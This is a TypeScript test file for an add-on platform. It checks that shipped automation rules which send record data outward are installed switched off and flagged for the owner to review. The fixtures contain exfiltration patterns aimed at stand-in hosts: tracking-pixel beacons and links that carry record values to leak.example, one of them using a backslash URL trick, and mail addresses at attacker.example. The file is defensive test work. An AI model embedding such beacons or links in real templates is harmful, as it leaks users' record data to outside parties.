// SPDX-License-Identifier: AGPL-3.0-only
/**
 * A SHIPPED STEP THAT SENDS OUT WITH NO ADDRESS TO FILL IN ARRIVES SWITCHED OFF.
 *
 * A webhook and a mail to typed addresses are not the only ways out. A step
 * that writes an address of the file's own into the column a mail goes to,
 * an add-on's step given an address, a mail whose template links to an
 * outside host with the record's values in the link: each rule arrives
 * switched off, with an "after you install" item naming the step, on every
 * engine. An update that brings such a step switches an unchanged rule off
 * again; one the owner already looked at stays as they left it.
 */
import { DOCUMENT_LOCALE_IDS } from '@adminium/add-on-contracts';
import { appAfterInstallRepo, automationsRepo, type Automation } from '@adminium/meta';
import type { Manifest } from '@adminium/manifest';
import { afterEach, describe, expect, it } from 'vitest';

import { installAutomations, outboundSteps, plannedAfterInstallOfRules } from '../src/apps/manifest-automations.js';
import { loadSnapshotView } from '../src/data-io/snapshot-view.js';
import { bareAddress } from '../src/installs/resolve.js';
import { addOnHarness, ENGINES, type Harness } from './app-add-ons.helpers.js';
import { stockKitManifest } from './fixtures/stock-kit/index.js';
import { onlyInstall } from './only-install.js';

// eslint-disable-next-line @typescript-eslint/no-explicit-any -- a manifest and a stored rule read freely
type Doc = Record<string, any>;

const words = (text: string) => Object.fromEntries(DOCUMENT_LOCALE_IDS.map((id) => [id, text]));
const node = (id: string, kind: string, more: Doc = {}) => ({ id, kind, title: `Step ${id}`, ...more });
const trigger = { kind: 'record', event: 'updated', table: 'items', changedColumn: 'zone' };
const mailTemplate = (key: string, blocks: Doc[]) => ({ key, name: key, locales: { 'en-US': { subject: '{{record.name}} moved', blocks } } });

const TEMPLATES = [
  // An outside link that carries nothing of the record: sends nothing out.
  mailTemplate('stock-kit-plain', [{ block: 'email.text', data: { text: 'Only {{record.left}} left.' } }, { block: 'email.button', data: { label: 'Read how', url: 'https://docs.example/stock' } }]),
  mailTemplate('stock-kit-beacon', [{ block: 'email.image', data: { url: 'https://track.example/p.png?n={{record.name}}', alt: 'x' } }]),
  // A backslash where the slashes go: a browser goes to leak.example all the same.
  mailTemplate('stock-kit-link', [{ block: 'email.button', data: { label: 'Open', url: 'https:\\\\leak.example/c?l={{record.left}}' } }]),
];
/** Raw markup: no app template may hold it, so it is read here from the file alone. */
const HTML_TEMPLATE = mailTemplate('stock-kit-html', [{ block: 'email.html', data: { code: '<a href="//leak.example/c?l={{record.left}}">Open</a>' } }]);

/** A step of the kit's own that writes a take, given an address. */
const NOTE_STEP = {
  key: 'note',
  name: words('Note it'),
  does: words('Writes a take'),
  inputs: [{ key: 'to', label: words('To'), kind: 'email' }],
  writes: { table: 'takes', values: { item_id: { token: 'recordKey' }, note: { input: 'to' } } },
};

const RULE = (key: string, nodes: Doc[]): Doc => ({ key, name: key, enabled: true, trigger, graph: { version: 1, nodes: [node('t', 'trigger'), ...nodes] } });
const RULES: Doc[] = [
  // Writes an address of the file's own into the column the next rule mails.
  RULE('fill-contact', [node('w', 'action', { action: { kind: 'record.update', values: { contact: 'buyer@attacker.example' } } })]),
  RULE('mail-contact', [node('m', 'action', { action: { kind: 'email', templateKey: 'stock-kit-plain', to: { kind: 'field', column: 'contact' }, class: 'service' } })]),
  // A mail whose template beacons the record out, and one whose raw markup links it out.
  RULE('beacon', [node('b', 'action', { action: { kind: 'email', templateKey: 'stock-kit-beacon', to: { kind: 'field', column: 'buyer_email' }, class: 'service' } })]),
  RULE('html-link', [node('h', 'action', { action: { kind: 'notification', to: { roles: ['manager'] }, title: 'x' } }), node('l', 'action', { action: { kind: 'email', templateKey: 'stock-kit-link', to: { kind: 'field', column: 'buyer_email' }, class: 'service' } })]),
  // An add-on's step given an address of the file's own.
  RULE('step-out', [node('s', 'action', { action: { kind: 'add-on.step', addOn: 'stock-kit', step: 'note', inputs: { to: 'drop@attacker.example' } } })]),
  // Sends nothing out: keeps its switch.
  RULE('tidy', [node('u', 'action', { action: { kind: 'record.update', values: { opening: '0', name: '{{record.name}}' } } })]),
  RULE('mail-plain', [node('p', 'action', { action: { kind: 'email', templateKey: 'stock-kit-plain', to: { kind: 'field', column: 'buyer_email' }, class: 'service' } })]),
];

const FLAGGED = [
  { kind: 'outbound', item: 'fill-contact', field: 'w' },
  { kind: 'outbound', item: 'mail-contact', field: 'm' },
  { kind: 'outbound', item: 'beacon', field: 'b' },
  { kind: 'outbound', item: 'html-link', field: 'l' },
  { kind: 'outbound', item: 'step-out', field: 's' },
];

function kit(rules: Doc[] = RULES): Doc {
  const base = stockKitManifest() as Doc;
  const tables = (base['requiredSchema'] as Doc)['tables'] as Doc[];
  const items = tables.find((table) => table['ref'] === 'items')!;
  return {
    ...base,
    compatibility: { minAdminiumVersion: '0.3.49' },
    addOn: { ...(base['addOn'] as Doc), steps: [NOTE_STEP] },
    requiredSchema: {
      ...(base['requiredSchema'] as Doc),
      tables: [
        { ...items, columns: [...(items['columns'] as Doc[]), { ref: 'contact', type: 'text', maxLength: 200, nullable: true }, { ref: 'buyer_email', type: 'text', maxLength: 200, nullable: true }] },
        ...tables.filter((table) => table !== items).map((table) => (table['ref'] === 'takes' ? { ...table, columns: [...(table['columns'] as Doc[]), { ref: 'note', type: 'text', maxLength: 200, nullable: true }] } : table)),
      ],
    },
    emailTemplates: TEMPLATES,
    automations: structuredClone(rules),
  };
}

describe('the steps that send out with no address to fill in', () => {
  it('are found from the file alone, every rule at once', () => {
    const found = outboundSteps(kit() as unknown as Manifest);
    expect(Object.fromEntries(found)).toEqual({ 'fill-contact': ['w'], 'mail-contact': ['m'], beacon: ['b'], 'html-link': ['l'], 'step-out': ['s'] });
  });

  it('a raw markup template that links the record out counts too', () => {
    const doc = kit([RULE('h', [node('x', 'action', { action: { kind: 'email', templateKey: 'stock-kit-html', to: { kind: 'field', column: 'buyer_email' } } })])]);
    expect(Object.fromEntries(outboundSteps({ ...doc, emailTemplates: [HTML_TEMPLATE] } as unknown as Manifest))).toEqual({ h: ['x'] });
  });

  it('counts each way out, and leaves what sends nothing', () => {
    const one = (rules: Doc[], templates: Doc[] = TEMPLATES) => Object.fromEntries(outboundSteps({ ...kit(rules), emailTemplates: templates } as unknown as Manifest));
    const write = (values: Doc) => RULE('w', [node('x', 'action', { action: { kind: 'record.update', values } })]);
    // An address anywhere, a link carrying the record out: out, with no mail step in the file.
    expect(one([write({ name: '{{record.name}}@attacker.example' })])).toEqual({ w: ['x'] });
    expect(one([write({ name: 'https://leak.example/?v={{record.left}}' })])).toEqual({ w: ['x'] });
    // Words of its own in a column nothing mails, a plain link, a copy of the record: nothing out.
    expect(one([write({ name: 'Checked', zone: 'shelf' })])).toEqual({});
    expect(one([write({ name: 'See https://docs.example/stock' })])).toEqual({});
    expect(one([write({ contact: '{{record.name}}' })])).toEqual({});
    // A mail's own values that link out; a summary whose template carries the rows out.
    const mail = (more: Doc) => RULE('m', [node('x', 'action', { action: { kind: 'email', templateKey: 'stock-kit-plain', to: { kind: 'field', column: 'buyer_email' }, ...more } })]);
    expect(one([mail({ vars: { link: 'https://leak.example/{{record.left}}' } })])).toEqual({ m: ['x'] });
    expect(one([mail({ vars: { greeting: 'Hello {{record.name}}' } })])).toEqual({});
    const digest = RULE('d', [node('x', 'action', { action: { kind: 'digest', templateKey: 'stock-kit-beacon', to: { roles: ['manager'] }, sections: [] } })]);
    expect(one([digest])).toEqual({ d: ['x'] });
    // A template link nobody can tell (the whole address a value of the record) counts too.
    expect(one([mail({})], [mailTemplate('stock-kit-plain', [{ block: 'email.button', data: { label: 'Go', url: '{{record.website}}' } }])])).toEqual({ m: ['x'] });
    // An add-on step's phone number of the file's own; its record value is no address of the file's.
    const step = (inputs: Doc) => RULE('s', [node('x', 'action', { action: { kind: 'add-on.step', addOn: 'sms', step: 'send', inputs } })]);
    expect(one([step({ to: '+44 20 7946 0000' })])).toEqual({ s: ['x'] });
    expect(one([step({ to: '{{record.phone}}', text: 'Your order is ready' })])).toEqual({});
  });

  it('are listed for the review before anything is made', () => {
    expect(plannedAfterInstallOfRules({ ...kit(), kind: 'app' } as unknown as Manifest).filter((item) => item.kind === 'outbound')).toEqual(FLAGGED);
  });
});

for (const [dialect, available] of ENGINES) {
  describe.skipIf(!available)(`a shipped rule whose step sends out [${dialect}]`, () => {
    let h: Harness | null = null;
    afterEach(async () => {
      await h?.close();
      h = null;
    });

    async function installed(doc: Doc = kit()): Promise<Harness> {
      const harness = await addOnHarness(dialect, { unbuiltWords: {} });
      await harness.stageAddOn(doc, { files: { 'dist/client.js': 'export default function Count() { return null; }' } });
      const reply = await harness.inject({ method: 'POST', url: '/add-ons', payload: { key: 'stock-kit', version: '1.0.0', attachTo: [] } });
      expect(reply.statusCode, reply.body).toBe(200);
      return harness;
    }
    const rulesOf = (harness: Harness) => automationsRepo(harness.meta).listManagedBy('stock-kit', harness.connectionId);
    const byKey = async (harness: Harness, key: string): Promise<Automation> => (await rulesOf(harness)).find((rule) => rule.templateKey === key)!;
    const again = async (harness: Harness, doc: Doc) => {
      const view = await loadSnapshotView(harness.meta, harness.connectionId);
      const install = bareAddress((await onlyInstall(harness.meta, 'stock-kit')).installId, 'stock-kit');
      return installAutomations({ meta: harness.meta, manifest: doc as unknown as Manifest, install, connectionId: harness.connectionId, view, realId: (ref) => view.model.tables.find((table) => table.name === `stock_kit_${ref}`)?.id ?? ref });
    };

    it('arrives switched off with its words kept, and an after-install item for each such step', async () => {
      h = await installed();
      for (const key of ['fill-contact', 'mail-contact', 'beacon', 'html-link', 'step-out']) expect((await byKey(h, key)).enabled, key).toBe(false);
      for (const key of ['tidy', 'mail-plain']) expect((await byKey(h, key)).enabled, key).toBe(true);
      // The file's words stay, for the owner to read before switching it on.
      const fill = await byKey(h, 'fill-contact');
      expect(((fill.graph.nodes as Doc[]).find((one) => one['id'] === 'w') as Doc)['action']['values']).toEqual({ contact: 'buyer@attacker.example' });
      const items = await appAfterInstallRepo(h.meta).list((await onlyInstall(h.meta, 'stock-kit')).installId);
      expect(items.filter((item) => item.kind === 'outbound').map(({ kind, item, field }) => ({ kind, item, field }))).toEqual(expect.arrayContaining(FLAGGED));
      expect(items.filter((item) => item.kind === 'outbound')).toHaveLength(FLAGGED.length);
    });

    it('an update that brings one switches an unchanged rule off again; one already shown stays as its owner left it', async () => {
      h = await installed();
      const repo = automationsRepo(h.meta);
      // The owner looked at the beacon and switched it on; the plain mail was on from the start.
      await repo.update((await byKey(h, 'beacon')).id, { enabled: true });
      expect((await byKey(h, 'mail-plain')).enabled).toBe(true);

      // 1.1.0: the plain mail now carries the record out.
      const next = kit();
      next['emailTemplates'] = [...TEMPLATES.filter((one) => one.key !== 'stock-kit-plain'), mailTemplate('stock-kit-plain', [{ block: 'email.button', data: { label: 'Open', url: 'https://leak.example/?l={{record.left}}' } }])];
      const result = await again(h, next);
      expect(result?.afterInstall).toEqual(expect.arrayContaining([{ kind: 'outbound', item: 'mail-plain', field: 'p' }, { kind: 'outbound', item: 'beacon', field: 'b' }]));
      expect((await byKey(h, 'mail-plain')).enabled).toBe(false);
      expect((await byKey(h, 'beacon')).enabled).toBe(true);
      expect((await byKey(h, 'tidy')).enabled).toBe(true);
    });
  });
}
